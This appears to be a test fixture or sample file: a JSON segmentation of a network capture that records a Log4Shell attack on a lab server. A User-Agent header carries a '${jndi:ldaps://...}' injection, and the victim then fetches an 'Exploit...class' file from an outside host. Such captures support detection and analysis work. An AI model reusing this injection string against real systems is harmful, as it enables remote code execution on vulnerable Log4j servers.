@@ -1,0 +1,424 @@
+{
+  "streams": [
+    {
+      "stream_key": "172.17.0.1:38166-172.17.0.2:8000-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_request.uri",
+          "payload": "/test"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://172.17.0.2:8000/test"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_header.host",
+          "payload": "172.17.0.2:8000"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_header.user_agent",
+          "payload": "${jndi:ldaps://ldaps.suspect.network:443/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 172.17.0.2:8000\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: ${jndi:ldaps://ldaps.suspect.network:443/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept-Encoding: gzip, deflate\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: */*\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /test HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 4,
+          "time": 9.2e-05,
+          "timestamp_utc": "2021-12-14T21:34:10.860236000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /test HTTP/1.1\r\nHost: 172.17.0.2:8000\r\nUser-Agent: ${jndi:ldaps://ldaps.suspect.network:443/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:55936-34.91.73.37:443-tcp",
+      "protocol": "TLS",
+      "encrypted": true,
+      "segments": [
+        {
+          "no": 9,
+          "time": 0.009721,
+          "timestamp_utc": "2021-12-14T21:34:10.869865000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 15,
+          "time": 0.028297,
+          "timestamp_utc": "2021-12-14T21:34:10.888441000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 17,
+          "time": 0.033182,
+          "timestamp_utc": "2021-12-14T21:34:10.893326000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 19,
+          "time": 0.033753,
+          "timestamp_utc": "2021-12-14T21:34:10.893897000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 23,
+          "time": 0.038023,
+          "timestamp_utc": "2021-12-14T21:34:10.898167000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 27,
+          "time": 0.040742,
+          "timestamp_utc": "2021-12-14T21:34:10.900886000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 40,
+          "time": 0.051912,
+          "timestamp_utc": "2021-12-14T21:34:10.912056000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 41,
+          "time": 0.052203,
+          "timestamp_utc": "2021-12-14T21:34:10.912347000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:443-172.17.0.2:55936-tcp",
+      "protocol": "TLS",
+      "encrypted": true,
+      "segments": [
+        {
+          "no": 11,
+          "time": 0.01058,
+          "timestamp_utc": "2021-12-14T21:34:10.870724000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 13,
+          "time": 0.012236,
+          "timestamp_utc": "2021-12-14T21:34:10.872380000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 21,
+          "time": 0.034317,
+          "timestamp_utc": "2021-12-14T21:34:10.894461000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 25,
+          "time": 0.039829,
+          "timestamp_utc": "2021-12-14T21:34:10.899973000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 28,
+          "time": 0.043809,
+          "timestamp_utc": "2021-12-14T21:34:10.903953000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 43,
+          "time": 0.052981,
+          "timestamp_utc": "2021-12-14T21:34:10.913125000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:54814-34.91.73.37:8080-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_request.uri",
+          "payload": "/Exploiti979xwPA6O.class"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37:8080/Exploiti979xwPA6O.class"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_header.host",
+          "payload": "34.91.73.37:8080"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_header.user_agent",
+          "payload": "Java/1.8.0_181"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: Java/1.8.0_181\r\n"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 34.91.73.37:8080\r\n"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /Exploiti979xwPA6O.class HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 33,
+          "time": 0.046151,
+          "timestamp_utc": "2021-12-14T21:34:10.906295000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /Exploiti979xwPA6O.class HTTP/1.1\r\nUser-Agent: Java/1.8.0_181\r\nHost: 34.91.73.37:8080\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: keep-alive\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:8080-172.17.0.2:54814-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 35,
+          "time": 0.04844,
+          "timestamp_utc": "2021-12-14T21:34:10.908584000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Tue, 14 Dec 2021 21:34:10 GMT\r\nContent-length: 1217\r\n\r\n"
+        },
+        {
+          "no": 37,
+          "time": 0.048776,
+          "timestamp_utc": "2021-12-14T21:34:10.908920000Z",
+          "position": "http_request.uri",
+          "payload": "/Exploiti979xwPA6O.class"
+        },
+        {
+          "no": 37,
+          "time": 0.048776,
+          "timestamp_utc": "2021-12-14T21:34:10.908920000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37:8080/Exploiti979xwPA6O.class"
+        },
+        {
+          "no": 37,
+          "time": 0.048776,
+          "timestamp_utc": "2021-12-14T21:34:10.908920000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 OK\\r\\n"
+        },
+        {
+          "no": 37,
+          "time": 0.048776,
+          "timestamp_utc": "2021-12-14T21:34:10.908920000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 37,
+          "time": 0.048776,
+          "timestamp_utc": "2021-12-14T21:34:10.908920000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Tue, 14 Dec 2021 21:34:10 GMT\r\n"
+        },
+        {
+          "no": 37,
+          "time": 0.048776,
+          "timestamp_utc": "2021-12-14T21:34:10.908920000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-length: 1217\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:8000-172.17.0.1:38166-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 47,
+          "time": 0.055777,
+          "timestamp_utc": "2021-12-14T21:34:10.915921000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Tue, 14 Dec 2021 21:34:10 GMT\r\nContent-length: 20\r\n\r\n"
+        },
+        {
+          "no": 49,
+          "time": 0.055866,
+          "timestamp_utc": "2021-12-14T21:34:10.916010000Z",
+          "position": "http_request.uri",
+          "payload": "/test"
+        },
+        {
+          "no": 49,
+          "time": 0.055866,
+          "timestamp_utc": "2021-12-14T21:34:10.916010000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://172.17.0.2:8000/test"
+        },
+        {
+          "no": 49,
+          "time": 0.055866,
+          "timestamp_utc": "2021-12-14T21:34:10.916010000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 OK\\r\\n"
+        },
+        {
+          "no": 49,
+          "time": 0.055866,
+          "timestamp_utc": "2021-12-14T21:34:10.916010000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 49,
+          "time": 0.055866,
+          "timestamp_utc": "2021-12-14T21:34:10.916010000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Tue, 14 Dec 2021 21:34:10 GMT\r\n"
+        },
+        {
+          "no": 49,
+          "time": 0.055866,
+          "timestamp_utc": "2021-12-14T21:34:10.916010000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-length: 20\r\n"
+        },
+        {
+          "no": 49,
+          "time": 0.055866,
+          "timestamp_utc": "2021-12-14T21:34:10.916010000Z",
+          "position": "tcp_payload.text",
+          "payload": "This is the response"
+        }
+      ]
+    }
+  ]
+}
